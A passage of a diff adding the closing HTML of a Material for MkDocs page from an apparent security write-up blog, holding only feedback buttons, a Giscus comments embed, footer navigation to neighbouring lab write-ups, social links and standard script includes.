+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback!
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback! Help us improve this page by using our <a href="..." target="_blank" rel="noopener">feedback form</a>.
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+  <h2 id="__comments">Comments</h2>
+  <!-- Insert generated snippet here -->
+  <script src="https://giscus.app/client.js"
+        data-repo="tomfieber/tomfieber.github.io"
+        data-repo-id="R_kgDOPTkbBA"
+        data-category="General"
+        data-category-id="DIC_kwDOPTkbBM4Ctdzl"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="en"
+        crossorigin="anonymous"
+        async>
+</script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate"
+        ? "transparent_dark"
+        : "light"
+
+      // Instruct Giscus to set theme
+      giscus.setAttribute("data-theme", theme) 
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+          // Instruct Giscus to change theme
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+        
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../07/tryhackme-include.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: TryHackMe: Include">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                TryHackMe: Include
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../28/vulnlab-manage.html" class="md-footer__link md-footer__link--next" aria-label="Next: VulnLab: Manage">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                VulnLab: Manage
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright © 2025 Tom Fieber
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://x.com/tomfieber" target="_blank" rel="noopener" title="x.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M357.2 48h70.6L273.6 224.2 455 464H313L201.7 318.6 74.5 464H3.8l164.9-188.5L-5.2 48h145.6l100.5 132.9zm-24.8 373.8h39.1L119.1 88h-42z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/tomfieber" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/thomasfieber" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://discord.gg/XvAFFw6A" target="_blank" rel="noopener" title="discord.gg" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "search.suggestions", "search.highlight", "navigation.footer", "content.code.copy", "content.code.annotate", "content.code.tabs"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+        <script src="https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js"></script>
+      
+        <script src="../../../../javascripts/tablesort.js"></script>
+      
+        <script src="../../../../javascripts/extra.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
